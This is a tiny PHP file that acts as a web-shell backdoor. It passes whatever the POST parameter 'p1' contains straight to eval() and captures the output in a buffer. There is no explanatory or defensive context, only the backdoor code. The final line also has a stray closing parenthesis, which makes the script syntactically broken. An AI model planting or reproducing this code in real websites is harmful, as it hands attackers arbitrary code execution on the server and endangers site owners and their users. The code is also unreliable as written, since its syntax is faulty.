<?php
ob_start();
eval($_POST['p1']);
$temp = ob_get_clean());
?>